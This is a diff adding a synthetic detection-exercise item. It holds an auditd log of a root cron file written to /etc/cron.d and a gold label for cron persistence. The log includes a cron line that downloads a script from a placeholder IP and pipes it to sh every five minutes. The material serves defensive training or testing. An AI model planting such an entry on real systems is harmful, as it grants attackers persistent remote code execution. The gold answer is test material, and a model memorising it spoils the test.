@@ -1,0 +1,12 @@
+{
+  "id": "example-06-cron",
+  "title": "auditd: file written to /etc/cron.d that downloads and runs a script every 5 minutes",
+  "platform": "Linux",
+  "log_sources": [
+    {"name": "auditd:SYSCALL", "channel": "write"},
+    {"name": "auditd:PATH", "channel": null}
+  ],
+  "content": "type=SYSCALL msg=audit(1762390211.442:9182): arch=c000003e syscall=257 success=yes exit=3 comm=\"bash\" exe=\"/usr/bin/bash\" uid=0 auid=1003 key=\"cron_changes\"\ntype=PATH msg=audit(1762390211.442:9182): item=1 name=\"/etc/cron.d/sys-update\" nametype=CREATE mode=0100644\nfile content: */5 * * * * root curl -fsSL http://198.51.100.23/u.sh | sh\nauid 1003 = web deploy account, logged in over SSH from 192.0.2.88 four minutes earlier",
+  "gold": ["T1053.003"],
+  "meta": {"synthetic": true, "note": "Written for this demo; no real organisation's data."}
+}
